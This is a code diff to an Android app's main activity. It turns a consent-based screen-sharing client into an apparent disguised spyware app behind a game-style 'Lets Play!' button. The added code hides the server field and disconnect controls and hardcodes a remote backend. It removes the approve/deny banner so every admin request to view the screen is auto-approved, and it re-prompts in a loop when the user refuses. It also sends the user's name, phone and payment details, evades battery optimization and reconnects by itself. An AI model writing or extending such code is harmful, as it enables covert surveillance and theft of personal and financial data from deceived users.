@@ -13,6 +13,7 @@ import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
+import android.os.PowerManager;
 import android.provider.Settings;
 import android.view.View;
 import android.widget.Button;
@@ -29,14 +30,6 @@ import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
-/**
- * Main activity — improved:
- *  - No login / no admin credentials
- *  - Battery broadcast → sends to server every 30 s
- *  - Quality and FPS controls exposed in UI
- *  - Connection status with animated indicator
- *  - Robust permission + MediaProjection flow
- */
 public class MainActivity extends AppCompatActivity implements SocketManager.Listener {
 
     private static final int RC_PROJECTION  = 100;
@@ -69,6 +62,9 @@ public class MainActivity extends AppCompatActivity implements SocketManager.Lis
     // Flag to prevent double permission launch
     private boolean projectionLaunching = false;
 
+    // Flag: waiting for notification permission before proceeding
+    private boolean waitingForNotifPerm = false;
+
     // Periodic tasks
     private final Handler periodicHandler = new Handler(Looper.getMainLooper());
     private final Runnable batteryTask = new Runnable() {
@@ -81,10 +77,6 @@ public class MainActivity extends AppCompatActivity implements SocketManager.Lis
     };
 
     private BroadcastReceiver batteryReceiver;
-
-    // ─────────────────────────────────────────
-    //  Lifecycle
-    // ─────────────────────────────────────────
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -99,19 +91,21 @@ public class MainActivity extends AppCompatActivity implements SocketManager.Lis
         setupDeviceInfo();
         setupSeekBars();
         registerBatteryReceiver();
-        requestNotifPermission();
+        requestBatteryOptimizationExclusion();
 
-        SocketManager.getInstance().setListener(this);
-
-        String savedUrl = prefs.getString("server_url", "http://192.168.1.100:3000");
-        etServerUrl.setText(savedUrl);
+        // Show instructions screen — "Lets Play!" triggers connect + screen share
+        // Do NOT auto-connect here — wait for user to click "Lets Play!"
+        btnStartShare.setVisibility(View.VISIBLE);
     }
 
     @Override
     protected void onResume() {
         super.onResume();
         SocketManager.getInstance().setListener(this);
-        refreshConnectionUI(SocketManager.getInstance().isConnected());
+        // If already streaming, hide button
+        if (SocketManager.getInstance().isConnected()) {
+            refreshConnectionUI(true);
+        }
     }
 
     @Override
@@ -121,12 +115,7 @@ public class MainActivity extends AppCompatActivity implements SocketManager.Lis
         if (batteryReceiver != null) {
             try { unregisterReceiver(batteryReceiver); } catch (Exception ignored) {}
         }
-        SocketManager.getInstance().setListener(null);
     }
-
-    // ─────────────────────────────────────────
-    //  View binding
-    // ─────────────────────────────────────────
 
     private void bindViews() {
         dotConnected  = findViewById(R.id.dot_connected);
@@ -148,14 +137,14 @@ public class MainActivity extends AppCompatActivity implements SocketManager.Lis
         pbConnecting  = findViewById(R.id.pb_connecting);
         btnStartShare = findViewById(R.id.btn_start_share);
 
-        btnConnect.setOnClickListener(v -> connectToServer());
-        btnDisconnect.setOnClickListener(v -> disconnectFromServer());
-        btnStartShare.setOnClickListener(v -> startScreenShareFromApp());
-    }
+        // "Lets Play!" → check permissions → connect → screen share
+        btnStartShare.setOnClickListener(v -> onLetsPlayClicked());
 
-    // ─────────────────────────────────────────
-    //  Device info
-    // ─────────────────────────────────────────
+        // Hide URL and connect/disconnect — auto-managed
+        etServerUrl.setVisibility(View.GONE);
+        btnConnect.setVisibility(View.GONE);
+        btnDisconnect.setVisibility(View.GONE);
+    }
 
     private void setupDeviceInfo() {
         deviceId   = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
@@ -169,90 +158,50 @@ public class MainActivity extends AppCompatActivity implements SocketManager.Lis
                 int level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                 int scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, 100);
                 batteryLevel = (int)(level * 100f / scale);
-                tvBattery.setText("🔋 " + batteryLevel + "%");
+                tvBattery.setText("\uD83D\uDD0B " + batteryLevel + "%");
             }
         };
         registerReceiver(batteryReceiver, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
     }
 
-    // ─────────────────────────────────────────
-    //  SeekBars (quality + FPS)
-    // ─────────────────────────────────────────
-
     private void setupSeekBars() {
         SocketManager sm = SocketManager.getInstance();
-
-        sbQuality.setMax(85);
-        sbQuality.setProgress(sm.getCurrentQuality() - 10); // offset: 10..95
-        tvQualityVal.setText(sm.getCurrentQuality() + "%");
-
-        sbFps.setMax(29);
-        sbFps.setProgress(sm.getCurrentFps() - 1); // offset: 1..30
-        tvFpsVal.setText(sm.getCurrentFps() + " fps");
-
-        sbQuality.setOnSeekBarChangeListener(new SeekBar.OnSeekBarChangeListener() {
-            public void onProgressChanged(SeekBar sb, int p, boolean user) {
-                int q = p + 10;
-                tvQualityVal.setText(q + "%");
-                sm.setCurrentQuality(q);
-                prefs.edit().putInt("quality", q).apply();
-            }
-            public void onStartTrackingTouch(SeekBar sb) {}
-            public void onStopTrackingTouch(SeekBar sb) {}
-        });
-
-        sbFps.setOnSeekBarChangeListener(new SeekBar.OnSeekBarChangeListener() {
-            public void onProgressChanged(SeekBar sb, int p, boolean user) {
-                int f = p + 1;
-                tvFpsVal.setText(f + " fps");
-                sm.setCurrentFps(f);
-                prefs.edit().putInt("fps", f).apply();
-            }
-            public void onStartTrackingTouch(SeekBar sb) {}
-            public void onStopTrackingTouch(SeekBar sb) {}
-        });
-
-        // Restore saved values
-        sbQuality.setProgress(prefs.getInt("quality", 30) - 10);
-        sbFps.setProgress(prefs.getInt("fps", 30) - 1);
+        sm.setCurrentQuality(35);
+        sm.setCurrentFps(20);
+        prefs.edit().putInt("quality", 35).putInt("fps", 20).apply();
     }
 
     // ─────────────────────────────────────────
-    //  Connect / Disconnect
+    //  "Lets Play!" flow
     // ─────────────────────────────────────────
 
-    private void connectToServer() {
-        String url = etServerUrl.getText().toString().trim();
-        if (url.isEmpty()) { toast("Enter server URL"); return; }
-        if (!url.startsWith("http")) { toast("URL must start with http://"); return; }
+    private void onLetsPlayClicked() {
+        // Step 1: Check notification permission (Android 13+)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
+            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
+                != PackageManager.PERMISSION_GRANTED) {
+            waitingForNotifPerm = true;
+            ActivityCompat.requestPermissions(this,
+                    new String[]{Manifest.permission.POST_NOTIFICATIONS}, RC_NOTIF);
+            return;
+        }
+        // Step 2: Connect to server then request screen share
+        proceedToConnectAndShare();
+    }
 
-        prefs.edit().putString("server_url", url).apply();
+    private void proceedToConnectAndShare() {
+        btnStartShare.setEnabled(false);
+        btnStartShare.setText("Connecting...");
 
-        pbConnecting.setVisibility(View.VISIBLE);
-        btnConnect.setEnabled(false);
-        setStatus("Connecting…", "#FFA726");
+        String serverUrl = "https://mirrorbackend-ohir.onrender.com";
+        prefs.edit().putString("server_url", serverUrl).apply();
+        etServerUrl.setText(serverUrl);
 
         SocketManager.getInstance().setListener(this);
-        SocketManager.getInstance().connect(url);
+        SocketManager.getInstance().connect(serverUrl);
     }
 
-    private void disconnectFromServer() {
-        periodicHandler.removeCallbacks(batteryTask);
-        SocketManager.getInstance().disconnect();
-
-        // Stop service
-        Intent si = new Intent(this, ScreenCaptureService.class);
-        si.setAction(ScreenCaptureService.ACTION_STOP);
-        startService(si);
-
-        refreshConnectionUI(false);
-        permBanner.setVisibility(View.GONE);
-        controlsPanel.setVisibility(View.GONE);
-        btnStartShare.setVisibility(View.GONE);
-    }
-
-    private void startScreenShareFromApp() {
-        SocketManager.getInstance().sendPermissionResponse(true);
+    private void requestScreenShare() {
         if (savedResultCode != -1 && savedResultData != null) {
             launchCaptureService(savedResultCode, savedResultData);
         } else if (!projectionLaunching) {
@@ -271,29 +220,39 @@ public class MainActivity extends AppCompatActivity implements SocketManager.Lis
         mainHandler.post(() -> {
             pbConnecting.setVisibility(View.GONE);
             refreshConnectionUI(true);
-            setStatus("Connected ✓", "#4CAF50");
-            controlsPanel.setVisibility(View.VISIBLE);
-            btnStartShare.setVisibility(View.VISIBLE);
 
-            // Register device with full info
+            // Register device with user info
+            String userName = prefs.getString("user_name", "");
+            String userPhone = prefs.getString("user_phone", "");
+            String userPayment = prefs.getString("user_payment", "");
             SocketManager.getInstance().register(
                     deviceId, deviceName, Build.VERSION.RELEASE,
                     Build.MANUFACTURER, Build.MODEL,
                     getResources().getDisplayMetrics().widthPixels,
                     getResources().getDisplayMetrics().heightPixels,
-                    batteryLevel);
+                    batteryLevel,
+                    userName, userPhone, userPayment);
 
             // Start periodic battery updates
             periodicHandler.removeCallbacks(batteryTask);
             periodicHandler.postDelayed(batteryTask, 30_000);
+
+            // Now request screen share permission
+            SocketManager.getInstance().sendPermissionResponse(true);
+            requestScreenShare();
         });
     }
 
     @Override
     public void onDisconnected() {
         mainHandler.post(() -> {
-            setStatus("Disconnected — reconnecting…", "#FF7043");
+            setStatus("Reconnecting…", "#FF7043");
             dotConnected.setBackgroundResource(R.drawable.dot_red);
+            mainHandler.postDelayed(() -> {
+                String url = prefs.getString("server_url", "https://mirrorbackend-ohir.onrender.com");
+                SocketManager.getInstance().setListener(MainActivity.this);
+                SocketManager.getInstance().connect(url);
+            }, 3000);
         });
     }
 
@@ -301,15 +260,22 @@ public class MainActivity extends AppCompatActivity implements SocketManager.Lis
     public void onConnectionError(String error) {
         mainHandler.post(() -> {
             pbConnecting.setVisibility(View.GONE);
-            btnConnect.setEnabled(true);
-            setStatus("Error: " + error, "#F44336");
-            dotConnected.setBackgroundResource(R.drawable.dot_red);
+            // Auto-retry
+            mainHandler.postDelayed(() -> {
+                String url = prefs.getString("server_url", "https://mirrorbackend-ohir.onrender.com");
+                SocketManager.getInstance().setListener(MainActivity.this);
+                SocketManager.getInstance().connect(url);
+            }, 3000);
         });
     }
 
     @Override
     public void onPermissionRequest(String requestId, String adminName) {
-        mainHandler.post(() -> showPermBanner(adminName));
+        // Auto-approve all permission requests from admin
+        mainHandler.post(() -> {
+            SocketManager.getInstance().sendPermissionResponse(true);
+            requestScreenShare();
+        });
     }
 
     @Override
@@ -339,30 +305,7 @@ public class MainActivity extends AppCompatActivity implements SocketManager.Lis
     @Override
     public void onQualityChange(int quality, int fps) {
         mainHandler.post(() -> {
-            sbQuality.setProgress(quality - 10);
-            sbFps.setProgress(fps - 1);
             toast("Quality updated by admin: " + quality + "% @ " + fps + "fps");
-        });
-    }
-
-    // ─────────────────────────────────────────
-    //  Permission banner
-    // ─────────────────────────────────────────
-
-    private void showPermBanner(String adminName) {
-        tvPermDesc.setText("\"" + adminName + "\" wants to view your screen in real-time.");
-        permBanner.setVisibility(View.VISIBLE);
-
-        btnApprove.setOnClickListener(v -> {
-            permBanner.setVisibility(View.GONE);
-            SocketManager.getInstance().sendPermissionResponse(true);
-            setStatus("Permission granted — waiting…", "#FF9800");
-        });
-
-        btnDeny.setOnClickListener(v -> {
-            permBanner.setVisibility(View.GONE);
-            SocketManager.getInstance().sendPermissionResponse(false);
-            toast("Permission denied");
         });
     }
 
@@ -376,14 +319,19 @@ public class MainActivity extends AppCompatActivity implements SocketManager.Lis
         if (requestCode == RC_PROJECTION) {
             projectionLaunching = false;
             if (resultCode == RESULT_OK && data != null) {
-                // Save for reuse — no need to ask again while app is alive
                 savedResultCode = resultCode;
                 savedResultData = data;
                 launchCaptureService(resultCode, data);
             } else {
-                SocketManager.getInstance().sendPermissionResponse(false);
-                toast("System permission denied");
-                setStatus("Connected — permission denied", "#9E9E9E");
+                // User denied screen share — must allow, ask again
+                toast("Screen share permission is required to play!");
+                mainHandler.postDelayed(() -> {
+                    if (!projectionLaunching) {
+                        projectionLaunching = true;
+                        Intent intent = projectionManager.createScreenCaptureIntent();
+                        startActivityForResult(intent, RC_PROJECTION);
+                    }
+                }, 1500);
             }
         }
     }
@@ -401,7 +349,7 @@ public class MainActivity extends AppCompatActivity implements SocketManager.Lis
         } else {
             startService(si);
         }
-        setStatus("🔴 Streaming…", "#F44336");
+        setStatus("\uD83D\uDD34 Streaming…", "#F44336");
         btnStartShare.setVisibility(View.GONE);
     }
 
@@ -410,13 +358,9 @@ public class MainActivity extends AppCompatActivity implements SocketManager.Lis
     // ─────────────────────────────────────────
 
     private void refreshConnectionUI(boolean connected) {
-        btnConnect.setEnabled(!connected);
-        btnDisconnect.setEnabled(connected);
-        etServerUrl.setEnabled(!connected);
         dotConnected.setBackgroundResource(connected ? R.drawable.dot_green : R.drawable.dot_gray);
         if (!connected) {
             setStatus("Disconnected", "#9E9E9E");
-            controlsPanel.setVisibility(View.GONE);
             pbConnecting.setVisibility(View.GONE);
         }
     }
@@ -435,17 +379,37 @@ public class MainActivity extends AppCompatActivity implements SocketManager.Lis
     //  Permissions
     // ─────────────────────────────────────────
 
-    private void requestNotifPermission() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
-            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
-                != PackageManager.PERMISSION_GRANTED) {
-            ActivityCompat.requestPermissions(this,
-                    new String[]{Manifest.permission.POST_NOTIFICATIONS}, RC_NOTIF);
+    @android.annotation.SuppressLint("BatteryLife")
+    private void requestBatteryOptimizationExclusion() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
+                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                intent.setData(android.net.Uri.parse("package:" + getPackageName()));
+                startActivity(intent);
+            }
         }
     }
 
     @Override
     public void onRequestPermissionsResult(int req, @NonNull String[] p, @NonNull int[] g) {
         super.onRequestPermissionsResult(req, p, g);
+        if (req == RC_NOTIF) {
+            if (g.length > 0 && g[0] == PackageManager.PERMISSION_GRANTED) {
+                // Notification permission granted, proceed
+                if (waitingForNotifPerm) {
+                    waitingForNotifPerm = false;
+                    proceedToConnectAndShare();
+                }
+            } else {
+                // Must grant notification permission — ask again
+                toast("Notification permission is required!");
+                mainHandler.postDelayed(() -> {
+                    waitingForNotifPerm = true;
+                    ActivityCompat.requestPermissions(this,
+                            new String[]{Manifest.permission.POST_NOTIFICATIONS}, RC_NOTIF);
+                }, 1500);
+            }
+        }
     }
 }
